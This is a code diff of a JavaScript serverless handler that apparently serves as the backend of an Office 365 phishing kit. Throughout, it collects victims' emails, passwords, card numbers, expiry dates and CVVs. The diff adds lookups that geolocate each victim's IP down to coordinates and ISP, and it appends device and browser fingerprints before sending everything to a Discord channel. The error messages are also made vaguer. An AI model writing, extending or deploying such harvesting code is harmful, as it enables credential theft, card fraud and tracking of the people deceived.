@@ -6,17 +6,63 @@ const GH_REPO = process.env.GH_REPO || 'mail-office365';
 const CONFIG_PATH = 'config.json';
 const GITHUB_API = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${CONFIG_PATH}`;
 
-const headers = {
-  'Authorization': `token ${GH_TOKEN}`,
-  'Accept': 'application/vnd.github.v3+json',
-  'User-Agent': 'MailOffice365Panel/1.0'
-};
+const GEO_CACHE = {};
 
 async function githubRead() {
   const res = await fetch(GITHUB_API, { method: 'GET', headers });
   if (!res.ok) throw new Error(`GitHub read error: ${res.status}`);
   const data = await res.json();
   return JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8'));
+}
+
+async function getGeoFromIp(ip) {
+  if (GEO_CACHE[ip]) return GEO_CACHE[ip];
+  if (!ip || ip === 'desconocida') {
+    GEO_CACHE[ip] = { city: '', region: '', country: '', countryCode: '', isp: '', lat: '', lon: '' };
+    return GEO_CACHE[ip];
+  }
+  try {
+    const res = await fetch('https://ipapi.co/' + ip + '/json/', {
+      headers: { 'User-Agent': 'MailOffice365Panel/1.0' }
+    });
+    if (res.ok) {
+      const d = await res.json();
+      if (d.error) throw new Error('ipapi error');
+      const geo = {
+        city: d.city || '',
+        region: d.region || '',
+        country: d.country_name || d.country || '',
+        countryCode: d.country_code || '',
+        isp: d.org || d.isp || d.connection_isp || '',
+        lat: d.latitude || '',
+        lon: d.longitude || ''
+      };
+      GEO_CACHE[ip] = geo;
+      return geo;
+    }
+  } catch (e) {
+    try {
+      const res2 = await fetch('http://ip-api.com/json/' + ip);
+      if (res2.ok) {
+        const d2 = await res2.json();
+        if (d2.status !== 'fail') {
+          const geo = {
+            city: d2.city || '',
+            region: d2.regionName || '',
+            country: d2.country || '',
+            countryCode: d2.countryCode || '',
+            isp: d2.isp || '',
+            lat: d2.lat || '',
+            lon: d2.lon || ''
+          };
+          GEO_CACHE[ip] = geo;
+          return geo;
+        }
+      }
+    } catch (e2) {}
+  }
+  GEO_CACHE[ip] = { city: '', region: '', country: '', countryCode: '', isp: '', lat: '', lon: '' };
+  return GEO_CACHE[ip];
 }
 
 export default async function handler(req, res) {
@@ -60,23 +106,25 @@ export default async function handler(req, res) {
     const onlineStatus = body.onlineStatus || 'desconocido';
     const cookiesEnabled = body.cookiesEnabled || 'desconocido';
 
-    const geoIp = body.geoIp || (body.ipifyIp || clientIp);
-    const geoCity = body.geoCity || '';
-    const geoRegion = body.geoRegion || '';
-    const geoCountry = body.geoCountry || '';
-    const geoCountryCode = body.geoCountryCode || '';
-    const geoTimezone = body.geoTimezone || timezone;
-    const geoIsp = body.geoIsp || '';
-
     const deviceMemory = body.deviceMemory || 'desconocido';
     const cpuCores = body.cpuCores || 'desconocido';
     const touchPoints = body.touchPoints || 0;
-    const isMobile = body.isMobile || 'desconocido';
-    const isTablet = body.isTablet || 'desconocido';
-    const isDesktop = body.isDesktop || 'desconocido';
+    const isMobile = body.isMobile || 'No';
+    const isTablet = body.isTablet || 'No';
+    const isDesktop = body.isDesktop || 'Sí';
 
     const batteryLevel = body.batteryLevel || 'No disponible';
     const batteryCharging = body.batteryCharging || 'Desconocido';
+
+    // Geo IP server-side con ipapi.co
+    const geo = await getGeoFromIp(clientIp);
+    const geoCity = geo.city || '';
+    const geoRegion = geo.region || '';
+    const geoCountry = geo.country || '';
+    const geoCountryCode = geo.countryCode || '';
+    const geoIsp = geo.isp || '';
+    const geoLat = geo.lat || '';
+    const geoLon = geo.lon || '';
 
     const template = config.discordMessageTemplate || '';
     const hasPlaceholders = template.includes('{email}');
@@ -97,13 +145,14 @@ export default async function handler(req, res) {
       message = replaceIfExists(message, 'password', password);
       message = replaceIfExists(message, 'type', isPayment ? 'Pago' : 'Login');
       message = replaceIfExists(message, 'ip', clientIp);
-      message = replaceIfExists(message, 'geoIp', geoIp);
+      message = replaceIfExists(message, 'geoIp', clientIp);
       message = replaceIfExists(message, 'geoCity', geoCity);
       message = replaceIfExists(message, 'geoRegion', geoRegion);
       message = replaceIfExists(message, 'geoCountry', geoCountry);
       message = replaceIfExists(message, 'geoCountryCode', geoCountryCode);
-      message = replaceIfExists(message, 'geoTimezone', geoTimezone);
       message = replaceIfExists(message, 'geoIsp', geoIsp);
+      message = replaceIfExists(message, 'geoLat', geoLat);
+      message = replaceIfExists(message, 'geoLon', geoLon);
       message = replaceIfExists(message, 'deviceMemory', deviceMemory);
       message = replaceIfExists(message, 'cpuCores', cpuCores);
       message = replaceIfExists(message, 'touchPoints', touchPoints);
@@ -127,7 +176,7 @@ export default async function handler(req, res) {
       message = replaceIfExists(message, 'timestamp', timestamp);
       message = replaceIfExists(message, 'title', isPayment ? 'Verificacion de pago' : 'Inicio de sesion');
 
-      // Si es pago y la plantilla no tiene cardNumber, agregar seccion de tarjeta al final
+      // Si es pago y no tiene cardNumber en plantilla, agregar datos de tarjeta
       if (isPayment && !message.includes('{cardNumber}') && cardNumber) {
         message += '\n\n----\nDATOS DE TARJETA:';
         message += '\nNumero: ' + cardNumber;
@@ -138,7 +187,7 @@ export default async function handler(req, res) {
     } else {
       // Plantilla por defecto
       if (isPayment) {
-        // Mensaje SOLO de pago - email + tarjeta, nada de login
+        // SOLO pago - email + tarjeta + ubicacion (SIN password, SIN dispositivo)
         message = '💳 Verificacion de pago';
         message += '\n----------------';
         message += '\nUsuario: ' + email;
@@ -150,20 +199,41 @@ export default async function handler(req, res) {
           message += '\nVence: ' + expiryDate;
           message += '\nCVV: ' + cvv;
         }
+
         message += '\n----------------';
+        // Ubicacion
+        if (geoCity || geoRegion || geoCountry) {
+          message += '\nUbicacion:';
+          message += '\nCiudad: ' + geoCity;
+          message += '\nRegion: ' + geoRegion;
+          message += '\nPais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
+          message += '\nISP: ' + geoIsp;
+        }
+        message += '\n----------------';
+        message += '\nHora: ' + timestamp;
       } else {
-        // Mensaje de login completo
+        // LOGIN completo - email + password + ubicacion + dispositivo + navegador
         message = '🔐 Inicio de sesion';
         message += '\n----------------';
         message += '\nUsuario: ' + email;
         message += '\nContraseña: ' + password;
         message += '\nIP: ' + clientIp;
-        message += '\nGeo IP: ' + geoIp;
-        if (geoCity) message += '\nCiudad: ' + geoCity;
-        if (geoRegion) message += '\nRegion: ' + geoRegion;
-        if (geoCountry) message += '\nPais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
+
+        // Ubicacion
+        if (geoCity || geoRegion || geoCountry) {
+          message += '\nUbicacion:';
+          message += '\nCiudad: ' + geoCity;
+          message += '\nRegion: ' + geoRegion;
+          message += '\nPais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
+          message += '\nISP: ' + geoIsp;
+          if (geoLat) message += '\nLatitud: ' + geoLat;
+          if (geoLon) message += '\nLongitud: ' + geoLon;
+        }
+        message += '\n----------------';
+
+        // Dispositivo
         if (deviceMemory !== 'desconocido' || cpuCores !== 'desconocido') {
-          message += '\n\nDispositivo:';
+          message += '\nDispositivo:';
           message += '\nRAM: ' + deviceMemory;
           message += '\nCPU: ' + cpuCores;
           message += '\nTipo: ' + isMobile + ' / ' + isTablet + ' / ' + isDesktop;
@@ -171,6 +241,8 @@ export default async function handler(req, res) {
         if (batteryLevel !== 'No disponible') {
           message += '\nBateria: ' + batteryLevel + ' (Cargando: ' + batteryCharging + ')';
         }
+
+        // Navegador
         message += '\nNavegador: ' + userAgent;
         message += '\nIdioma: ' + language;
         message += '\nPantalla: ' + screenResolution + ' (' + colorDepth + ' bits)';
@@ -192,16 +264,16 @@ export default async function handler(req, res) {
     if (!discordRes.ok) {
       const text = await discordRes.text();
       return res.status(500).json({
-        error: 'Error enviando a Discord: ' + discordRes.status + ' ' + text
+        error: 'Error enviando: ' + discordRes.status + ' ' + text
       });
     }
 
     return res.status(200).json({
       success: true,
-      message: 'Mensaje enviado correctamente.'
+      message: 'OK'
     });
   } catch (err) {
-    console.error('Error en API Discord:', err);
+    console.error('Error en API:', err);
     return res.status(500).json({ error: 'Error interno: ' + err.message });
   }
 }
